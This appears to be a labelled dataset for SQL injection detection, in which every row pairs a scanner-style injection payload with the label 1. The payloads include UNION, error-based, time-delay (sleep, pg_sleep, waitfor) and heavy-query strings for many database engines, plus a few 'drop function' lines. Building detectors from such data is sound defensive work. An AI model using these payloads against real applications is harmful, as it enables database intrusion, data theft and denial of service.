query;label
1'  )   as ywtu where 3009  =  3009 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
-9622' union all select 7208,7208,7208,7208#;1
1'||  (  select 'jmao' where 3009  =  3009;1
1  )   where 4698  =  4698 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
1'||  (  select 'rfjl' where 2476  =  2476 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||';1
1',  (  select   (  case when   (  6894  =  6087  )   then 1 else 6894*  (  select 6894 from information_schema.character_sets  )   end   )    )   ;1
1   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
"1""  )   where 9285  =  9285 and 8506  =  8343#";1
1'+  (  select wgmn where 4368  =  4368 and 7859  =  6151  )  +';1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq;1
-6200%'   )    )    or 8077  =  4661;1
1  )   rlike sleep  (  5  )  #;1
select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual--;1
1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618;1
1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --;1
1'  )   as zxos where 2745  =  2745;1
"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """;1
"1""   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""mxnj"" like ""mxnj";1
"1%""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #";1
1   )    )    as sfan where 7176  =  7176 and 7017  =  7358;1
"1""   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""xnsj"" like ""xnsj";1
call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'tpih'  =  'tpih;1
"1""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""ozvp""  =  ""ozvp";1
"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy";1
1' and make_set  (  3445  =  5963,5963  )   and 'wjfw'  =  'wjfw;1
"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""menm"" like ""menm";1
-7199'||  (  select 'ssty' where 5406  =  5406 order by 1#;1
call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'tmdj' like 'tmdj;1
1  )   and make_set  (  4593  =  7765,7765  )   and   (  8517  =  8517;1
"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#";1
select   (  case when   (  6434  =  3877  )   then 6434 else 1/  (  select 0  )   end  )  --;1
"1""   )    )    as rpxd where 4929  =  4929";1
"-7794""  )   union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#";1
1   )    )    as mlpf where 7425  =  7425;1
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jrpk'  =  'jrpk;1
1   )    )     )   waitfor delay '0:0:5'--;1
1,  (  select   (  case when   (  6750  =  6750  )   then 1 else 6750*  (  select 6750 from information_schema.character_sets  )   end   )    )   ;1
-9336' or 5641  =  9488#;1
1'||  (  select 'noik' from dual where 9851  =  9851;1
"1"" where 7045  =  7045";1
"-3501""   )    )     )   or   (  6789  =  6990  )  *6990 and    (    (     (  ""jnnc"" like ""jnnc";1
1%'   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   '%'  =  ';1
call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  ';1
-5026' or   (  8459  =  8459  )  *4906 and 'uavj' like 'uavj;1
1  )   as wust where 3884  =  3884 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --;1
"1""  )   union all select null#";1
-3955%'   )    )    union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#;1
1   )    )    as nxdf where 1696  =  1696 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #;1
select case when 6229  =  2077 then 1 else null end--;1
select   (  case when   (  5569  =  9390  )   then 5569 else 1/  (  select 0  )   end  )  --;1
1'  )   where 1363  =  1363;1
1  )   union all select null,null,null,null,null,null,null,null,null--;1
1'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   'wqme'  =  'wqme;1
"1""   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""gimc"" like ""gimc";1
-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#;1
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv;1
1' or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
"1"" rlike   (  select   (  case when   (  2724  =  4757  )   then 1 else 0x28 end   )    )    and ""cmsa""  =  ""cmsa";1
select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'lckw'  =  'lckw;1
"1""   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""kcxw""  =  ""kcxw";1
1 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ;1
-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#;1
"1%""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""%""  =  """;1
"1""   )    )    as frsd where 6475  =  6475 union all select null,null,null,null,null,null,null,null,null,null--";1
if  (  3831  =  9321  )   select 3831 else drop function ybru--;1
"1""  )   where 9861  =  9861";1
if  (  3490  =  4920  )   select 3490 else drop function hlzt--;1
1  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ;1
"1""  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""pqsp""  =  ""pqsp";1
select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg;1
1'  )   where 3262  =  3262 union all select null,null,null,null,null,null,null,null,null,null#;1
-2573   )    )    order by 1#;1
"-2027%""  )   union all select 2048,2048,2048,2048,2048,2048,2048,2048#";1
1 where 3354  =  3354;1
"1""   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""dtfg""  =  ""dtfg";1
"-3853""  )   where 4626  =  4626 union all select 4626,4626,4626--";1
1'+  (  select 'vwzp' where 2729  =  2729 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --;1
1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar;1
-3096' or 3821  =  5539 and 'zrth'  =  'zrth;1
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs;1
1 union all select null,null,null,null,null,null,null,null,null--;1
1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  # msrb;1
1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep;1
"-5230""  )   or elt  (  1032  =  1032,3623  )   and   (  ""aivb"" like ""aivb";1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'nbzf' like 'nbzf;1
-8349  )   union all select 8126,8126#;1
"1""  )   as buky where 7898  =  7898 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --";1
"1""  )   where 4567  =  4567 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --";1
"1"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ";1
1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'rxxb'  =  'rxxb;1
1  )   where 2232  =  2232;1
"-3637"" or   (  8459  =  8459  )  *4906";1
1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --;1
1'   )    )    as xntz where 5801  =  5801 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --;1
iif  (  2452  =  8999,1,1/0  )  ;1
1'  )   as bihs where 4197  =  4197;1
-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--;1
1   )    )     )   union all select null,null,null,null,null,null--;1
"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp";1
1  )   where 7680  =  7680 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --;1
1'||  (  select 'fwph' where 3791  =  3791;1
1'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'xtdj'  =  'xtdj;1
-2981   )    )    or   (  8459  =  8459  )  *4906 and    (    (   4202  =  4202;1
1'||  (  select 'tvcy' where 5592  =  5592 order by 1#;1
-5320 where 8051  =  8051 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --;1
1%'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  '%'  =  ';1
1 where 5691  =  5691 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --;1
" select sleep  (  5  )   and ""cyrb""  =  ""cyrb";1
1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'jhlj'  =  'jhlj;1
1  )   as oknr where 3228  =  3228;1
"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg";1
"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --";1
"1""   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""lxue"" like ""lxue";1
-8490   )    )    union all select 6910,6910,6910,6910,6910,6910#;1
1   )    )     )   union all select null,null,null,null,null,null,null--;1
"1"" union all select null,null,null,null--";1
1   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  9558  =  9558;1
"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""jzsb""  =  ""jzsb";1
select case when 1892  =  3646 then 1 else null end--;1
"-7416"" where 7656  =  7656 order by 1--";1
"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""tbbk"" like ""tbbk";1
select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#;1
"-6747"" or 9323  =  9323#";1
-1219'  )   or 5592  =  4835;1
"1""   )    )     )   union all select null,null,null,null,null#";1
1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'cjre'  =  'cjre;1
"-8566""  )   as hnch where 3418  =  3418 union all select 3418,3418,3418,3418,3418,3418,3418#";1
-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--;1
1%'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
1  )   as mtda where 3951  =  3951;1
1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'eugs'  =  'eugs;1
1'  )   where 7908  =  7908 or sleep  (  5  )  --;1
-1438 where 6759  =  6759 union all select 6759,6759#;1
iif  (  9190  =  5059,1,1/0  )  ;1
"1""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""oohx"" like ""oohx";1
"1"" where 2365  =  2365 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --";1
 (  select chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7812  =  7812  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )   from dual  ) ;1
1'  )   and   (  1414  =  4775  )  *4775 and   (  'mlmw'  =  'mlmw;1
select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'wmoo' like 'wmoo;1
1'||  (  select 'bpml' where 7360  =  7360 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||';1
1'  )   where 9221  =  9221 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --;1
1  )   where 9338  =  9338 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --;1
1  )   as qjbd where 2808  =  2808   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --;1
1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'dogx'  =  'dogx;1
-1890'   )    )     )   or 8526  =  1389 and    (    (     (  'ecgt'  =  'ecgt;1
1  )   where 7026  =  7026;1
-6388'+  (  select 'jqld' where 8600  =  8600 union all select 8600,8600#;1
"1""   )    )    and 2006  =  2006";1
"1""  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --";1
1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'wevl'  =  'wevl;1
"-1425""  )   where 8056  =  8056 or elt  (  1032  =  1032,3623  )  --";1
1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --;1
1%'   )    )    union all select null,null,null,null#;1
1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ;1
1'||  (  select 'hvqw' from dual where 4423  =  4423 union all select null,null,null--;1
end and    (    (   'eqoc' like 'eqoc;1
1'  )   as lewd where 3118  =  3118 order by 1--;1
"-6076""   )    )    or 8277  =  4757";1
"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --";1
"-6680""   )    )     )   union all select 2564,2564,2564,2564,2564,2564#";1
1   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --;1
1'  )   as upgb where 2031  =  2031;1
1' where 6795  =  6795 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --;1
1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'jjxn'  =  'jjxn;1
select case when 2599  =  7035 then 1 else null end--;1
1%' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '%'  =  ';1
"1""  )   as eibf where 5026  =  5026 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --";1
select   (  case when   (  8403  =  7151  )   then 8403 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--;1
1'||  (  select 'epjf' from dual where 8584  =  8584 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --;1
1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  # fzni;1
1  )   where 9860  =  9860 and 4443  =  4111--;1
"1""  )   where 3122  =  3122 and sleep  (  5  )  #";1
"1""   )    )    as eglv where 7412  =  7412 union all select null#";1
1 and sleep  (  5  )  -- ruuv;1
1  )   rlike   (  select   (  case when   (  8488  =  1270  )   then 1 else 0x28 end   )    ) ;1
1%' union all select null,null,null#;1
1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'cimm' like 'cimm;1
1'||  (  select 'omeg' from dual where 4751  =  4751;1
"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""ijag";1
-2314%'   )    )    union all select 4612,4612--;1
1%' and 7533  =  7533 and '%'  =  ';1
1',extractvalue  (  9788,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  9788  =  9788,1   )    )     )  ,0x717a767a71   )    )   ;1
1'  )   as eymt where 3911  =  3911 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --;1
1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #;1
1'  )   where 8211  =  8211 union all select null,null,null,null,null#;1
-1083'  )   union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--;1
"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp";1
"1%""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""%""  =  """;1
1   )    )    as kycl where 8008  =  8008 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --;1
1'   )    )     )   and elt  (  9041  =  6421,6421  )   and    (    (     (  'ixxg' like 'ixxg;1
1  )   as attr where 8085  =  8085 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
"1"" where 2035  =  2035 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --";1
-5891 union all select 7103,7103,7103,7103--;1
1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'xgzb'  =  'xgzb;1
1'   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --;1
1'   )    )    as mbzk where 9153  =  9153 and 2006  =  2006;1
"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #";1
1'+  (  select 'hcqf' where 9956  =  9956 and   (  2993  =  4297  )  *4297  )  +';1
1'||  (  select 'gved' from dual where 6965  =  6965;1
-8963  )   where 8528  =  8528 or   (  2470  =  3271  )  *3271--;1
1' or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'scye' like 'scye;1
"1""   )    )    as kmss where 3214  =  3214 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --";1
"1""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""igop""  =  ""igop";1
1'+  (  select afst where 7454  =  7454 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +';1
1  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ;1
1 where 5929  =  5929 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --;1
"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--";1
-7267  )   union all select 1912,1912,1912,1912,1912,1912,1912,1912--;1
1'+  (  select 'idmr' where 5029  =  5029 union all select null,null,null,null,null,null--;1
1'+  (  select dklk where 9862  =  9862 union all select null,null,null,null,null,null--;1
"-4588"" union all select 4550,4550,4550,4550#";1
-3971%'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  '%'  =  ';1
1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #;1
select   (  case when   (  3863  =  1151  )   then 3863 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--;1
"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--";1
1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  5468  =  5468;1
1'  )   where 6244  =  6244 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --;1
"1""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   ""imlq"" like ""imlq";1
1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd;1
1%'   )    )    or sleep  (  5  )  #;1
"1""   )    )    and make_set  (  1167  =  5027,5027  )   and    (    (   ""grfi""  =  ""grfi";1
1%'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  '%'  =  ';1
"1%""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ""%""  =  """;1
-1765'  )   order by 1--;1
-3088' or 6872  =  6872 and 'miwk'  =  'miwk;1
"1%""   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --";1
1  )   where 1443  =  1443 union all select null,null,null,null,null#;1
1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --;1
1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #;1
-1036'  )   or 6872  =  6872 and   (  'wvbi'  =  'wvbi;1
"1""  )   where 3404  =  3404 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --";1
"select sleep  (  5  )   and ""%""  =  """;1
1'+  (  select qdon where 9453  =  9453;1
"-7884"" where 3297  =  3297 or 2492  =  6158";1
"1""  )   where 1673  =  1673 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --";1
